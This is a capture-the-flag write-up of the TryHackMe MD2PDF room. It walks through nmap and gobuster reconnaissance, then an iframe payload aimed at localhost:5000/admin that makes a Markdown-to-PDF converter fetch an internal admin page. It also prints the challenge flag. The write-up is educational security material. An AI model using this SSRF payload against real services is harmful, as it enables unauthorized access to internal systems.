# TryHackMe - MD2PDF Writeup

**Difficulty:** Easy  
**Category:** SSRF (Server Side Request Forgery)  
**Author:** YourName  
**Date:** 28-02-2026  

---

## Summary
This challenge revolves around a Markdown to PDF converter web application that is vulnerable to Server Side Request Forgery (SSRF). The goal is to trick the server into making an internal request to access an admin page that is only accessible from localhost.

---

## Reconnaissance

### Nmap Scan
```bash
nmap 10.49.130.37
```

Found 3 open ports:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

Port 5000 is interesting — it's an internal service not exposed publicly.

---

## Step 1 — Web Enumeration

Visited `http://10.49.130.37` — a simple Markdown to PDF converter web app.

Ran Gobuster to find hidden directories:
```bash
gobuster dir -u http://10.49.130.37 -w /usr/share/wordlists/dirb/common.txt
```

Found:
```
/admin   (Status: 403) [Size: 166]
```

---

## Step 2 — Discovering the SSRF Vector

Visited `http://10.49.130.37/admin` and got:
```
Forbidden
This page can only be seen internally (localhost:5000)
```

This tells us the `/admin` page is only accessible if the request comes from **localhost:5000** — a classic SSRF opportunity.

---

## Step 3 — Exploiting SSRF via iframe

Since the web app converts Markdown to PDF, the **server itself processes the content**. By embedding an iframe pointing to the internal admin page, we can trick the server into fetching it on our behalf.

Submitted the following as Markdown input:
```html
<iframe src="http://localhost:5000/admin"></iframe>
```

When the server converted this to PDF, it made an internal request to `localhost:5000/admin` — which is allowed since it comes from the server itself. The PDF came back with the admin page content including the flag.

---

## Flag

```
flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```

---

## What is SSRF?

**Server Side Request Forgery (SSRF)** is a vulnerability where an attacker tricks the server into making HTTP requests to internal services on their behalf. Since the request originates from the server itself, it can bypass firewall rules and access internal resources that are not publicly accessible.

---

## Lessons Learned
- Always enumerate hidden directories with Gobuster
- Internal services running on non-standard ports (like 5000) can be SSRF targets
- Web apps that fetch or render external content are often vulnerable to SSRF
- HTML tags like `<iframe>` inside Markdown can be a vector for SSRF attacks